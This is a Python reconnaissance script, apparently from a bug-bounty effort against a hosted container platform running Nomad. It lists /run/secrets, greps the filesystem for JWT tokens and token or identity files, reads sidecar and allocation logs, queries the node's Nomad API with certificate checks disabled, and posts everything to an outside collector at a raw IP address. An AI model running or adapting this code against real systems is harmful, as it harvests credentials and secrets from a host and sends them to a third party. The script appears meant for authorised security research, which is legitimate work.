#!/usr/bin/env python3
"""probe17 - close the two gaps in probe16: /run (incl. /run/secrets) was never swept, and the
allocation's plain .0 log files (sidecar/preflight/run/pod) were never read.

The sidecar is the component that holds the Nomad token; its logs describe how it talks to the node, and
may carry endpoints, allocation metadata, or (badly) credentials. Read-only.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

import socket
import ssl

COLLECTOR = "http://208.87.134.252:9200/rt17"
NODE = "169.254.1.2"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "run_tree": {}, "logs": {}, "local_api": {}, "jwt": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sh(cmd, t=25):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=t)
        return (r.stdout + r.stderr).decode("utf-8", "replace").strip()[:1200]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def api_get(path, timeout=8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((NODE, 4646))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=NODE)
        t.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n" % (path, NODE, UA)).encode())
        d = b""
        while len(d) < 2000:
            try:
                c = t.recv(1200)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        t.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:50])


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

RESULTS["run_tree"] = {
    "/run listing": sh("ls -laR /run 2>&1 | head -40"),
    "/run/secrets": sh("ls -la /run/secrets 2>&1 | head -10; for f in /run/secrets/*; do [ -f \"$f\" ] && echo \"--- $f\"; done"),
    "run jwt grep": sh("grep -rlaE 'eyJ[A-Za-z0-9_-]{8,}\\.' /run /var /tmp 2>/dev/null | head -10"),
}
RESULTS["jwt"] = {
    "broad sweep (excl /proc /sys)": sh(
        "find / -xdev \\( -path /proc -o -path /sys -o -path /alloc/logs \\) -prune -o -type f "
        "\\(' -name \"*identity*\" -o -name \"*token*\" -o -name \"*.jwt\" -o -name \"nomad*\" \\) -print 2>/dev/null | head -25"),
    "content grep": sh("grep -rlaE 'eyJ[A-Za-z0-9_-]{8,}\\.' /run /etc /var /opt /usr/local 2>/dev/null | head -10"),
}

for name in ("sidecar.stdout.0", "sidecar.stderr.0", "preflight.stdout.0", "preflight.stderr.0",
             "run.stdout.0", "run.stderr.0", "pod.stdout.0", "pod.stderr.0"):
    RESULTS["logs"][name] = sh("tail -c 1200 /alloc/logs/%s 2>&1" % name)

for p in ("/v1/agent/self", "/v1/client/stats", "/v1/agent/members", "/v1/status/leader", "/v1/agent/health",
          "/v1/client/fs/ls?allocation_id=x&path=/"):
    r = api_get(p)
    RESULTS["local_api"][p] = "%s :: %s" % (r.split("\r\n")[0], r.split("\r\n\r\n", 1)[-1][:120].replace("\n", " "))

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:4000])
while True:
    time.sleep(60)
